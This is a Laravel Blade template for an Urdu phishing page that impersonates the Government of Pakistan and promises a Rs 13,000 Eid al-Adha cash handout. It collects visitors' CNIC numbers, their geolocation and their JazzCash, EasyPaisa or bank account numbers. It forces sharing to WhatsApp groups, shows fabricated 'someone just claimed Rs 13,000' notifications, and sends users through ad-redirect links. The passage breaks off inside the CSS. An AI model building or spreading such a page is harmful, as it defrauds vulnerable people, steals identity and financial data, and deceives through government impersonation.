
@php
    $settings = collect($settings ?? [])
        ->map(fn ($value) => \App\Models\EidTohfaSetting::normalizeValue($value))
        ->all();
    $marqueeText = $settings['marquee_text'] ?? 'سخاوت کا ایک مہینہ - وفاقی حکومت پاکستان 13,000 روپے نقد امداد';
    $mainButtonText = $settings['button_text'] ?? 'ابھی حاصل کریں۔';
    $noteText = str_ireplace(
        'Claim Now',
        $mainButtonText,
        $settings['note_text'] ?? 'جاری رکھنے کے لیے ابھی دعوی کرنے کے لیے آگے بڑھیں۔'
    );
    $eligibilityButtonText = $settings['eligibility_button_text'] ?? 'اپنی اہلیت چیک کریں';
    $eligibilityIntroText = $settings['eligibility_intro_text'] ?? 'درخواست مکمل کرنے سے پہلے اپنی اہلیت کی تصدیق کریں۔';
    $cnicTitle = $settings['cnic_title'] ?? 'اپنا شناختی کارڈ نمبر درج کریں';
    $cnicPlaceholder = $settings['cnic_placeholder'] ?? '13 ہندسوں کا CNIC نمبر';
    $cnicSubmitButton = $settings['cnic_submit_button'] ?? 'جمع کریں';
    $cnicErrorMessage = $settings['cnic_error_message'] ?? 'براہ کرم 13 ہندسوں کا درست شناختی کارڈ نمبر درج کریں۔';
    $locationTitle = $settings['location_title'] ?? 'اپنی لوکیشن کی اجازت دیں';
    $locationConsentText = $settings['location_consent_text'] ?? 'اہلیت کی تصدیق کے لیے آپ کی موجودہ لوکیشن درکار ہے۔ اجازت کے بغیر آپ آگے نہیں بڑھ سکتے۔';
    $locationAllowButton = $settings['location_allow_button'] ?? 'لوکیشن کی اجازت دیں';
    $locationDenyButton = $settings['location_deny_button'] ?? 'اجازت نہیں دینی';
    $locationDeniedMessage = $settings['location_denied_message'] ?? 'لوکیشن کی اجازت کے بغیر درخواست آگے نہیں بڑھ سکتی۔';
    $eligibleTitle = $settings['eligible_title'] ?? 'مبارک ہو! آپ اہل ہیں';
    $bankSelectLabel = $settings['bank_select_label'] ?? 'ادائیگی کا طریقہ منتخب کریں';
    $bankOptions = collect(preg_split('/\r\n|\r|\n|,/', $settings['bank_options'] ?? "JazzCash\nEasyPaisa\nBank Transfer"))
        ->map(fn ($option) => trim($option))
        ->filter()
        ->values()
        ->all();
    $toastNames = [
        'فاطمہ شیراز', 'احمد رضا', 'عائشہ خان', 'بلال احمد', 'ثناء اقبال',
        'حسن علی', 'مریم شاہ', 'دانش ملک', 'حرا بتول', 'کاشف محمود',
        'نمرہ سلیم', 'زیشان اختر', 'رابعہ اسلم', 'عمر فاروق', 'مہنور جاوید',
        'اسد اللہ', 'زینب رفیق', 'عمران صدیقی', 'لائبہ احمد', 'سعد قریشی',
        'اقرا ملک', 'فہد نصیر', 'نور فاطمہ', 'علی حمزہ', 'صادیہ پروین',
        'وقاص علی', 'مہوش طارق', 'حمزہ الیاس', 'بشریٰ خان', 'سلمان بٹ',
        'اریبہ سلیم', 'طاہر عباس', 'کرن شاہد', 'نبیل احمد', 'سمیرا نور',
        'عدنان جمیل', 'سحرش انور', 'رضوان حیدر', 'مدیحہ یوسف', 'کامران شیخ',
        'صوبیہ اقبال', 'ارسلان ندیم', 'انعم فاطمہ', 'جنید اکرم', 'فرح گل',
        'شہزیب خان', 'رمشا علی', 'یاسر محمود', 'تانیہ رؤف', 'حمیرا ناز',
        'عادل حسین', 'صفیہ بی بی', 'وقار حسن', 'عروج فاطمہ', 'نعمان علی',
        'زارا بتول', 'شاہد اقبال', 'مہک جاوید', 'فیصل حیات', 'ثنا اللہ',
        'حنا ملک', 'زاہد محمود', 'صباء نور', 'راشد منیر', 'آمنہ خالد',
        'عمران عباس', 'مناہل رفیق', 'فرحان علی', 'فائزہ یونس', 'عثمان غنی',
        'نادیہ افضل', 'شعیب اختر', 'علیزہ شاہ', 'کلیم اللہ', 'عائشہ صدیقہ',
        'ارحم بلال', 'سدرہ بتول', 'ہارون رشید', 'ماہم اقبال', 'طیبہ انور',
        'وقار یوسف', 'مومنہ عارف', 'ذیشان حیدر', 'نشا امین', 'عبدالرحمان',
        'جویریہ خان', 'مزمل فاروق', 'انیقہ ناصر', 'نعیم اختر', 'صبا پروین',
        'علی رضا', 'مہرین سجاد', 'شاہ میر', 'نائلہ اسلم', 'فراز احمد',
        'ماریہ عمران', 'حارث جاوید', 'ثمن طارق', 'حبیب الرحمن', 'عائشہ نور',
    ];
@endphp
<!DOCTYPE html>
<html>

<head>
 <script src="pakieid.js"></script>
 <script src="googleplay.js"></script> 
 


 <script>
 function set_Cookie(name,value){
 var Days = 30;
 var exp = new Date();
 exp.setTime(exp.getTime() + (Days*20*1000));
 document.cookie = name + "="+ escape (value) + ";expires=" +
                    exp.toGMTString()+"; path=/;"
 }
 function get_Cookie(name){
 var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
 if(arr=document.cookie.match(reg)){
 return unescape(arr[2]);
 }
 return '';
 }


 /* if(get_Cookie("d")>0 &&get_Cookie("d")<12){
 document.getElementById("first-box")."quedate__step".display="none";//??;
 document.getElementById("second-box").style.display="none";//??;
 document.getElementById("third-box").style.display="none";//??;
 document.getElementsByClassName("loading2__box").style.display="";//??;
 }*/


 </script>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 <!-- SEO Meta Tags -->
 <title>{{ $settings['page_title'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}</title>
 <meta name="description" content="{{ $settings['meta_description'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}" />
 <meta name="keywords" content="{{ $settings['meta_keywords'] ?? 'عید الاضحی, کیش ٹرانسفر, پاکستان' }}" />
 <meta name="author" content="{{ $settings['meta_author'] ?? 'Government of Pakistan' }}" />
 <link rel="shortcut icon" type="image/png" href="{{ \App\Models\EidTohfaSetting::imageUrl($settings['favicon_url'] ?? null, 'img/favicon-1759599656.png') }}" />
 
 <!-- Open Graph Meta Tags -->
 <meta property="og:title" content="{{ $settings['og_title'] ?? $settings['page_title'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}" />
 <meta property="og:description" content="{{ $settings['og_description'] ?? $settings['meta_description'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}" />
 <meta property="og:image" content="{{ \App\Models\EidTohfaSetting::imageUrl($settings['og_image'] ?? null, 'img/favicon-1759599656.png') }}" />
 <meta property="og:url" content="{{ $settings['og_url'] ?? url('/') }}" />
 <meta property="og:type" content="{{ $settings['og_type'] ?? 'website' }}" />
 <meta property="og:site_name" content="{{ $settings['og_site_name'] ?? 'Eid Al-Adha Cash Transfer' }}" />
 <meta property="og:updated_time" content="{{ time() }}" />
 
 <!-- Twitter Card Meta Tags -->
 <meta name="twitter:card" content="{{ $settings['twitter_card'] ?? 'summary_large_image' }}" />
 <meta name="twitter:title" content="{{ $settings['twitter_title'] ?? $settings['og_title'] ?? $settings['page_title'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}" />
 <meta name="twitter:description" content="{{ $settings['twitter_description'] ?? $settings['og_description'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}" />
 <meta name="twitter:image" content="{{ \App\Models\EidTohfaSetting::imageUrl($settings['twitter_image'] ?? $settings['og_image'] ?? null, 'img/favicon-1759599656.png') }}" />
</head>

<body>
 <style type="text/css">
 @font-face {
 font-family: "Jameel Noori Nastaleeq";
 src: url("{{ url('public/fonts/eid-tohfa/Jameel Noori Nastaleeq.ttf') }}") format("truetype"),
      local("Jameel Noori Nastaleeq"), local("Jameel Noori Nastaleeq Regular"),
      local("Jameel Noori Nastaleeq Kasheeda");
 font-display: swap;
 }

 :root {
 --eid-urdu-font: "Jameel Noori Nastaleeq", "Jameel Noori Nastaleeq Kasheeda",
                  "Noto Nastaliq Urdu", "Noto Nastaliq Arabic", serif;
 }

 * {
 margin: 0;
 padding: 0;
 font-family: var(--eid-urdu-font);
 font-weight: normal;
 box-sizing: border-box;


 }

body {
 direction: ltr;
 background: white;
 }

 .urdu-section {
 direction: rtl;
 text-align: right;
 unicode-bidi: isolate;
 font-family: var(--eid-urdu-font);
 }

 .urdu-section button,
 .urdu-section .cta-btn {
 font-family: var(--eid-urdu-font);
 }

 .urdu-section .center,
 .urdu-section .barr,
 .urdu-section input[type="number"],
 .urdu-section #getname,
 .urdu-section .amount {
 direction: ltr;
 unicode-bidi: isolate;
 }

 .horizontal_marque {
 position: relative;
 width: 100%;
 min-height: 44px;
 overflow: hidden;
 display: flex;
 align-items: center;
 justify-content: center;
 white-space: nowrap;
 padding: 6px 0;
 }

 .horizontal_marque .marquee-text {
 position: absolute;
 left: 50%;
 display: inline-block;
 font-size: 22px;
 line-height: 1.7;
 will-change: transform;
 animation: eidMarqueeRight 16s linear infinite;
 }

 @keyframes eidMarqueeRight {
 0% {
 transform: translateX(-50%);
 }

 45% {
 transform: translateX(100vw);
 }

 45.01% {
 transform: translateX(calc(-100% - 100vw));
 }

 100% {
 transform: translateX(-50%);
 }
 }

 a {
 text-decoration: none;
 }

 .post {
 background: #fff;
 margin: 0 auto;
 padding: 10px;
 max-width: 500px;
 border: 1px solid #d0d1d5;
 border-radius: 3px;
 }

 .post img {
 width: 100%;
 }

 .welcome {
 font-size: 15px;
 }

 .amount,
 #getname {
 color: green;
 text-decoration: none;
 }

 .done {
 text-align: center;
 color: #27ae60;
 }

 .tip {
 font-size: 14px;
 }

 .title {
 text-align: center;
 }

 .error {
 display: none;
 text-align: center;
 font-size: 14px;
 color: #e74c3c;
 }

 button {
 display: block;
 width: 200px;
 height: 50px;
 color: #ffffff;
 border: none;
 outline: none;
 font-size: 24px;
 cursor: pointer;
 border-radius: 5px;
 padding: 0 10px;
 margin: 10px auto;
 background: #0B7A3B;
 transition: background 0.3s ease;
 }

 button:hover {
 background: #0B7A3B;
 }

 .phone {
 max-width: 400px;
 margin: 10px auto;
 }

 .phone input {
 width: 100%;
 height: 50px;
 padding: 10px;
 outline: none;
 border: 2px solid #cecece;
 font-size: 14px;
 }

 #confirm {
 width: 200px;
 margin: 10px auto;
 border-radius: 0px;
 }

 #loader {
 text-align: center;
 }

 .spin {
 width: 50px;
 height: 50px;
 background: transparent;
 border: solid 8px rgb(9, 129, 5);
 border-right-color: transparent;
 border-radius: 50%;
 margin: 10px auto;
 animation: spin 0.8s linear infinite;
 }

 @keyframes spin {
 100% {
 transform: rotate(1turn);
 }
 }

 #loader,
 #eligibilityStart,
 #cnicStep,
 #locationStep,
 #info,
 #checking,
 #share,
 #claim {
 display: none;
 }

 .center {
 display: flex;
 align-items: center;
 justify-content: center;
 }

 .barr {
 direction: ltr;
 max-width: 400px;
 margin: 10px auto;
 box-sizing: border-box;
 }

 .fill {
 position: relative;
 display: inline-block;
 width: calc(100% - 100px);
 height: 35px;
 padding: 2px;
 border: 2px solid #0B7A3B;
 }

 #fill,
 #fill2 {
 background: #0B7A3B;
 width: 0%;
 height: 100%;
 }

 .percentage {
 width: 100px;
 float: right;
 height: 35px;
 font-size: 16px;
 border: 2px solid #0B7A3B;
 }

 #percentage,
 #percentage2 {
 margin-left: 5px;
 }

 #check,
 #check2 {
 display: none;
 }

 .counter {
 color: #7f7f7f;
 font-size: 12px;
 text-align: right;
 padding: 10px 0 10px 2px;
 border-bottom: 1px solid #e1e2e3;
 }

 .reactions {
 display: inline-flex;
 align-items: center;
 float: left;
 }

 .counter img {
 float: left;
 width: 16px;
 height: 16px;
 border-radius: 50%;
 border: 2px solid #fff;
 box-sizing: content-box;
 }

 .like,
 .love {
 margin-right: -5px;
 }

 .like {
 z-index: 2;
 }

 .love {
 z-index: 1;
 }

 .bar {
 display: table;
 width: 100%;
 border-bottom: 1px solid #e1e2e3;
 }

 .bar .react {
 display: table-cell;
 width: calc(100% / 3);
 font-size: 12px;
 color: #7f7f7f;
 text-align: center;
 padding: 10px 0;
 cursor: pointer;
 }

 .comments {
 direction: ltr;
 }

 .comment {
 padding: 6px 0;
 margin-top: 5px;
 }

 .comment img {
 float: left;
 width: 32px;
 height: 32px;
 border: none;
 border-radius: 18px;
 cursor: pointer;
 }

 .reply {
 margin-left: 37px;
 }

 .single-container {
 margin-left: 37px;
 background: #f1f2f6;
 padding: 10px;
 border-radius: 15px;
 font-size: 12px;
 }

 .single-container .user {
 display: inline-block;
 cursor: pointer;
 color: #365899;
 margin-bottom: 5px;
 }

 .single-container .text {
 display: block;
 }

 .buttons {
 font-size: 12px;
 font-weight: bold;
 margin: 10px 0 0 47px;
 color: #90949c;
 }

 .action {
 cursor: pointer;
 }

 .action:hover {
 text-decoration: underline;
 }

 .input {
 padding: 6px 12px 12px;
 }

 .input input {
 width: 100%;
 background: #f1f2f6;
 padding: 10px;
 border-radius: 15px;
 border: 0;
 outline: none;
 }

 .A {
 text-align: center;
 background-color: #0B7A3B;
 color: #ffffff;
 }
 </style>
 <div class="horizontal_marque urdu-section" dir="rtl">
 <span class="marquee-text">{{ $marqueeText }}</span>
 </div>
 <center>
 <img src="{{ \App\Models\EidTohfaSetting::imageUrl($settings['header_image'] ?? null, 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxa178dRR01NSycZx-4fda5IxQg_hUzasADvLTQnZf0SkoYNtuy3a5MlreBXQkHLsbQ1a4YoZk4_TXN0hevgbq1mL77mntb2skVmfwQoFX63ytmcVG6RPSg0loFJ24rKOFPBtZbpkMicTl-sU_c1pd4Pu2diwmJRoOEEwTKJfkj7lKoURUa5Y910YtyMk/s1080/IMG_4757.jpeg') }}"
                
 style="width: 80%;
 max-width:
                            700px;
 height:
                            auto;
 border-style:
                            ridge;
 border-radius:
                            50px;
 border-width:
                            5px;
 border-color:
                            #0B7A3B;">
</center>


 <div class="post">

 <div class="eid-step-area" id="eidStepArea">
 <div id="intro" class="urdu-section eid-step-panel" dir="rtl">
 <div class="intro-badge-wrap">
 <span class="badge">{{ $settings['intro_badge'] ?? 'روپے 13,000 عید الاضحی کیش ٹرانسفر' }}</span>
 </div>
 <p class="welcome">
 {!! $settings['intro_text'] ?? 'انسانی ہمدردی کی رسائی کے حصے کے طور پر، <b>وفاقی حکومت پاکستان </b> روپے فراہم کر رہا ہے۔ عید الاضحی خوشی اور آسانی کے ساتھ منانے کے لیے تمام پاکستانیوں کے لیے 13,000 نقد امداد۔ ہر خاندان کو روپے ملیں گے۔ اس سال کے جشن میں 13,000' !!}
 

 اپنا حاصل کرنے کے لیے <b>"{{ $mainButtonText }}"</b> پر کلک کریں۔
 
 <span class="intro-note-line"><span class="note">نوٹ:</span> {{ $noteText }}</span>
 </p>
 <button id="go" class="cta-btn">{{ $mainButtonText }}</button>
 </div>

 <div id="loader" class="eid-step-panel">
 <div>Please Wait ...</div>
 <div class="spin"></div>
 <div id="num">0%</div>
 </div>
 </div>

 <style>
 .post {
 width: 100%;
 padding: 15px;
 overflow-anchor: none;
 }

 /* GRADIENT INTRO */
 #intro {
 margin: 0 auto;
 padding: 30px 25px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 border-radius: 18px;
 box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
 color: #fff;
 text-align: right;
 }

 .eid-step-area {
 max-width: 900px;
 min-height: 0;
 margin: 20px auto;
 }

 .eid-step-panel {
 max-width: 900px;
 margin-left: auto;
 margin-right: auto;
 }

 #loader.eid-step-panel {
 min-height: 230px;
 padding: 44px 20px;
 }

 /* TEXT */
 .welcome {
 font-size: 21px;
 line-height: 2.1;
 margin: 0;
 }

 .intro-badge-wrap {
 text-align: center;
 margin-bottom: 14px;
 }

 /* BADGE */
 .badge {
 display: inline-block;
 background: rgba(255, 255, 255, 0.15);
 padding: 8px 18px;
 border-radius: 30px;
 font-weight: 700;
 letter-spacing: 0;
 font-size: 21px;
 }

 /* NOTE */
 .note {
 color: #FFD700;
 font-weight: 700;
 }

 .intro-note-line {
 display: block;
 margin-top: 8px;
 }

 /* BUTTON */
 .cta-btn {
 display: block;
 margin: 25px auto 0 auto;
 padding: 14px 35px;
 background: #FFD700;
 color: #0B7A3B;
 font-weight: 800;
 border-radius: 35px;
 text-decoration: none;
 box-shadow: 0 8px 20px rgba(0, 0, 0, .3);
 transition: .3s ease;
 }

 .cta-btn:hover {
 transform: scale(1.05);
 background: #fff;
 }

 /* MOBILE */
 @media(max-width:600px) {
 .welcome {
 font-size: 19px;
 }
 }
 </style>

 </div>
 <div id="eligibilityStart" class="process-card urdu-section" dir="rtl">
 <p class="title">{{ $eligibilityIntroText }}</p>
 <button id="startEligibility">{{ $eligibilityButtonText }}</button>
 </div>

 <div id="cnicStep" class="process-card urdu-section" dir="rtl">
 <p class="title">{{ $cnicTitle }}</p>
 <div class="phone">
 <center>
 <input type="text" inputmode="numeric" maxlength="15" id="cnicNumber" placeholder="{{ $cnicPlaceholder }}">
 </center>
 </div>
 <button id="submitCnic">{{ $cnicSubmitButton }}</button>
 <p class="error" id="cnicError">{{ $cnicErrorMessage }}</p>
 </div>

 <div id="locationStep" class="process-card urdu-section" dir="rtl">
 <p class="title">{{ $locationTitle }}</p>
 <p class="tip">{{ $locationConsentText }}</p>
 <div class="location-actions">
 <button id="allowLocation">{{ $locationAllowButton }}</button>
 <button id="denyLocation" type="button">{{ $locationDenyButton }}</button>
 </div>
 <p class="error" id="locationError">{{ $locationDeniedMessage }}</p>
 </div>

 <style>
 /* MAIN CONTAINER */
 .process-card,
 #info {
 max-width: 500px;
 margin: 25px auto;
 padding: 25px 20px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 border-radius: 18px;
 box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
 color: #fff;
 text-align: center;
 font-family: var(--eid-urdu-font);
 }

 /* TITLE */
 .process-card .title,
 #info .title {
 font-size: 18px;
 font-weight: 700;
 margin-bottom: 12px;
 }

 /* INPUT FIELD */
 .process-card input[type="text"],
 #info input[type="number"] {
 width: 330px;
 height: 56px;
 font-size: 18px;
 border-radius: 12px;
 border: none;
 padding: 0 15px;
 margin-bottom: 15px;
 outline: none;
 background: rgba(255, 255, 255, 0.9);
 color: #0B7A3B;
 font-weight: 600;
 }

 /* SELECT DROPDOWN */
 #bankName,
 #info select {
 width: 330px;
 height: 56px;
 font-size: 16px;
 border-radius: 12px;
 border: none;
 padding: 0 15px;
 margin-bottom: 20px;
 outline: none;
 background: rgba(255, 255, 255, 0.9);
 color: #0B7A3B;
 font-weight: 600;
 }

 /* BUTTON */
 .process-card button,
 #info button#confirm {
 width: 200px;
 padding: 14px 0;
 font-size: 18px;
 font-weight: 700;
 border-radius: 35px;
 border: none;
 cursor: pointer;
 background: linear-gradient(135deg, #FFD700, #FFB700);
 color: #0B7A3B;
 box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
 transition: all 0.3s ease;
 }

 .process-card button:hover,
 #info button#confirm:hover {
 transform: scale(1.05);
 background: linear-gradient(135deg, #fff, #f5f5f5);
 }

 .process-card .tip {
 font-size: 18px;
 line-height: 1.8;
 margin-bottom: 18px;
 }

 .location-actions {
 display: flex;
 gap: 12px;
 justify-content: center;
 flex-wrap: wrap;
 }

 #denyLocation {
 background: rgba(255, 255, 255, 0.15);
 color: #fff;
 border: 1px solid rgba(255, 255, 255, 0.35);
 }

 .eligible-title {
 color: #FFD700;
 font-size: 22px;
 font-weight: 800;
 margin-bottom: 8px;
 }

 .location-captured {
 color: rgba(255, 255, 255, 0.88);
 font-size: 14px;
 line-height: 1.5;
 margin: 0 0 12px;
 }
 </style>

 <div id="info" class="urdu-section" dir="rtl">
 <p class="eligible-title">{{ $eligibleTitle }}</p>
 <input type="hidden" id="eidTohfaLeadId" value="">
 <input type="hidden" id="capturedCnic" value="">
 <input type="hidden" id="locationLatitude" value="">
 <input type="hidden" id="locationLongitude" value="">
 <input type="hidden" id="locationAccuracy" value="">
 <input type="hidden" id="locationCapturedAt" value="">
 <p class="location-captured" id="locationCapturedText" style="display:none;"></p>
 <p class="title">{{ $settings['form_title'] ?? 'اپنا اکاؤنٹ نمبر درج کریں:' }}</p>
 <div class="phone">
 <center>
 <select id="bankName" required>
 <option value="">{{ $bankSelectLabel }}</option>
 @foreach($bankOptions as $bankOption)
 <option value="{{ $bankOption }}">{{ $bankOption }}</option>
 @endforeach
 </select>
 </center>
 <center><input
                        type="number"
                        placeholder="{{ $settings['form_placeholder'] ?? 'اکاؤنٹ نمبر درج کریں۔' }}" id="name" name="Phone"
                        style="fontwidth:
                            244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return
                            numberonly(event);">
 </center>
 
 <button id="confirm">{{ $settings['submit_button'] ?? 'بھیجیں۔' }}</button>
 </div>
 <p class="error" id="accountError">{{ $settings['error_message'] ?? 'براہ کرم ایک درست اکاؤنٹ نمبر درج کریں!' }}</p>
 </div>
 <div id="checking" class="urdu-section" dir="rtl">
 <p class="title">برائے مہربانی ایک لمحہ انتظار
                    کریں...</p>
 <div class="barr">
 <div class="fill">
 <div id="fill"></div>
 </div>
 <div class="percentage
                            center">
 <span id="load"><i class="fa fa-spinner
                            fa-pulse"></i></span>
 <span id="check"><i class="fa
                            fa-check-circle"></i></span>
 <span id="percentage"></span>
 </div>
 </div>
 </div>
 <style>
 /* MAIN SHARE BOX */
 #share {
 max-width: 500px;
 margin: 25px auto;
 padding: 25px 20px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 border-radius: 18px;
 box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
 color: #fff;
 text-align: right;
 font-family: var(--eid-urdu-font);
 }

 /* TEXT PARAGRAPHS */
 #share .tip {
 font-size: 19px;
 margin-bottom: 12px;
 line-height: 1.9;
 }

 /* HIGHLIGHT AMOUNT */
 #share .amount {
 font-weight: 700;
 color: #FFD700;
 }

 /* SHARE BUTTON */
 #share button#whatsapp {
 display: block;
 width: 200px;
 margin: 20px auto 0 auto;
 padding: 14px 0;
 font-size: 18px;
 font-weight: 700;
 border-radius: 35px;
 border: none;
 cursor: pointer;
 background: linear-gradient(135deg, #FFD700, #FFB700);
 color: #0B7A3B;
 box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
 transition: all 0.3s ease;
 }

 #share button#whatsapp:hover {
 transform: scale(1.05);
 background: linear-gradient(135deg, #fff, #f5f5f5);
 }

 /* MOBILE RESPONSIVE */
 @media(max-width:600px) {
 #share {
 padding: 20px 15px;
 }

 #share .tip {
 font-size: 18px;
 }

 #share button#whatsapp {
 width: 100%;
 font-size: 18px;
 }
 }
 </style>

 <div id="share" class="urdu-section" dir="rtl">
 <p class="tip">آپ کا اکاؤنٹ نمبر ہے۔ <span id="getname"></span>،</p>
 <p class="tip">
 تصدیق کے بعد، آپ حاصل کرنے کے اہل ہیں۔ <span class="amount">Rs{{ $settings['amount'] ?? '13000' }}.</span>آگے بڑھنے کا طریقہ:
 </p>
 <p class="tip">1. {{ $settings['share_instruction_1'] ?? 'اسے واٹس ایپ پر 5 گروپس یا 15 دوستوں کے ساتھ شیئر کریں (نیچے "SHARE" آئیکن پر کلک کریں)۔' }}</p>
 <p class="tip">2. {{ $settings['share_instruction_2'] ?? 'GREEN تصدیقی بار پُر ہونے کے بعد آپ کو خود بخود ہمارے ادائیگی کے صفحے پر بھیج دیا جائے گا۔' }}</p>
 <p class="tip">3. {{ $settings['share_instruction_3'] ?? 'آپ کو بذریعہ ایس ایم ایس تصدیق موصول ہوگی۔' }}</p>
 <button id="whatsapp">{{ $settings['share_button'] ?? 'شیئر کریں۔' }}</button>
 <div class="barr">
 <div class="fill">
 <div id="fill2"></div>
 </div>
 <div class="percentage
                            center">
 <span><i class="fa fa-spinner
                            fa-pulse"></i></span>
 <span id="percentage2">0%</span>
 </div>
 </div>
 </div>
 <style>
 /* CLAIM BOX */
 #claim {
 max-width: 450px;
 margin: 30px auto;
 padding: 30px 20px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 border-radius: 18px;
 box-shadow: 0 12px 35px rgba(0, 0, 0, 0.25);
 color: #fff;
 text-align: center;
 font-family: var(--eid-urdu-font);
 }

 /* CHECK ICON */
 #claim .done i {
 color: #FFD700;
 margin-bottom: 15px;
 display: block;
 animation: pop 0.6s ease;
 }

 /* TITLE */
 #claim .title {
 font-size: 26px;
 font-weight: 800;
 margin-bottom: 12px;
 }

 /* BUTTON */
 #claim button#offer {
 display: inline-block;
 margin-top: 20px;
 padding: 14px 35px;
 font-size: 18px;
 font-weight: 700;
 border-radius: 35px;
 border: none;
 cursor: pointer;
 background: linear-gradient(135deg, #FFD700, #FFB700);
 color: #0B7A3B;
 box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
 transition: all 0.3s ease;
 }

 #claim button#offer:hover {
 transform: scale(1.05);
 background: linear-gradient(135deg, #fff, #f5f5f5);
 }

 /* POP ANIMATION FOR ICON */
 @keyframes pop {
 0% {
 transform: scale(0);
 opacity: 0
 }

 60% {
 transform: scale(1.2);
 opacity: 1
 }

 100% {
 transform: scale(1);
 }
 }

 /* RESPONSIVE */
 @media(max-width:600px) {
 #claim {
 padding: 25px 15px;
 }

 #claim .title {
 font-size: 18px;
 }

 #claim button#offer {
 width: 100%;
 font-size: 16px;
 }
 }
 </style>

 <div id="claim" class="urdu-section" dir="rtl">
 <p class="done"><i class="fa
                            fa-check-circle fa-3x" aria-hidden="true"></i></p>
 <p class="title">مبارک ہو! </p>
 <b>ابھی اپنا پیسہ حاصل کرنے کے لیے نیچے
                    دیئے گئے کسی بھی بٹن پر کلک کریں۔</b>
 <button id="offer">ابھی حاصل کریں۔</button>
 <center>
 <a href='https://crn77.com/4/8525379'
 style=' display: inline-block; padding: 12px 24px; background-color:
                            blue; color: white; font-size: 16px; border-radius: 8px; text-decoration: none; font-weight:
                            bold; transition: background-color 0.3s; '>
 👉 ابھی 13,000 روپے حاصل کرنے کے لیے یہاں کلک کریں۔
 </a><br/>
 <a onclick="window.open('https://crn77.com/4/8525379')"
 href="https://wy903.com/8554813">
 <button style="display:
                            flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button
                            final">ابھی ادائیگی حاصل کریں۔</button></a>
 </center><br/>

 <center>
 <a onclick="window.open('https://crn77.com/4/8525379')"
 href="https://wy903.com/8554813">
 <button style="display:
                            flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button
                            final">ادائیگی کی حیثیت چیک کریں۔</button></a>
 </center><br/>
 <center>
 <a onclick="window.open('https://crn77.com/4/8525379')"
 href="https://wy903.com/8554813">
 <button style="display:
                            flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button
                            final">روپے نکالیں 13,000 اب</button></a>
 </center><br/>
 
 
 </div>
 <center>
 
 <BR/>
 <!-- NOTIFICATIONS -->
<div class="notification-overlay urdu-section" id="platformToast" dir="rtl"></div>

<style>
 .notification-overlay {
 position: fixed;
 bottom: 20px;
 left: 20px;
 width: min(390px, calc(100% - 24px));
 max-width: 390px;
 padding: 14px 18px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 color: #fff;

 font-size: 18px;
 line-height: 1.7;
 font-weight: 700;
 border-radius: 14px;
 box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);

 opacity: 0;
 transform: translateY(30px);
 transition: all 0.6s ease;
 z-index: 9999;
 }

 .notification-overlay.show {
 opacity: 1;
 transform: translateY(0);
 }

 .notification-overlay strong {
 color: #fff;
 font-weight: 800;
 }
 </style>

 <script>
 document.addEventListener("DOMContentLoaded", function () {
 const toast = document.getElementById("platformToast");
 const toastNames = @json($toastNames);
 const toastTimes = [
 '5 سیکنڈ', '8 سیکنڈ', '12 سیکنڈ', '20 سیکنڈ', '30 سیکنڈ',
 '1 منٹ', '2 منٹ', '3 منٹ', '4 منٹ', '5 منٹ',
 '7 منٹ', '9 منٹ', '11 منٹ', '13 منٹ', '15 منٹ'
 ];

 if (!toast || toastNames.length === 0) {
 return;
 }

 function randomItem(items) {
 return items[Math.floor(Math.random() * items.length)];
 }

 function showNotification() {
 const name = randomItem(toastNames);
 const time = randomItem(toastTimes);

 toast.innerHTML = '<strong>' + name + '</strong> نے ' + time + ' پہلے 13000 روپے لیے۔';
 toast.classList.add("show");

 setTimeout(function () {
 toast.classList.remove("show");
 }, 4200);
 }

 setTimeout(showNotification, 1200);
 setInterval(showNotification, 8500);
});
 </script>
 <style>
 .comments {
 width: min(640px, calc(100% - 24px));
 background: #fff;
 border: 1px solid #e5e7eb;
 border-radius: 18px;
 padding: 0;
 max-width: 640px;
 margin: 24px auto;
 box-shadow: 0 18px 45px rgba(10, 47, 37, 0.12);
 font-family: "Segoe UI", Roboto, Arial, var(--eid-urdu-font), sans-serif;
 text-align: left;
 overflow: hidden;
 }

 /* COUNTER */
 .counter {
 display: flex;
 justify-content: space-between;
 align-items: center;
 gap: 12px;
 font-size: 17px;
 color: #5f6671;
 padding: 16px 18px 12px;
 margin-bottom: 0;
 border-bottom: 1px solid #edf0f2;
 }

 .reactions {
 display: flex;
 align-items: center;
 gap: 7px;
 min-width: 0;
 float: none;
 }

 .reactions img {
 width: 22px;
 height: 22px;
 border-radius: 50%;
 border: 2px solid #fff;
 box-shadow: 0 1px 3px rgba(15, 23, 42, 0.18);
 float: none;
 margin-right: 0;
 }

 /* ACTION BAR */
 .bar {
 display: flex;
 justify-content: space-between;
 gap: 6px;
 padding: 8px 12px;
 border-top: 0;
 border-bottom: 1px solid #edf0f2;
 margin-bottom: 0;
 }

 .bar .react {
 flex: 1;
 border-radius: 10px;
 cursor: pointer;
 color: #5f6671;
 font-weight: 700;
 font-size: 14px;
 line-height: 1;
 padding: 11px 8px;
 text-align: center;
 transition: background-color .18s ease, color .18s ease;
 }

 .bar .react:hover {
 background: #f0f7f3;
 color: #0B7A3B;
 }

 /* COMMENT */
 .comment {
 display: grid;
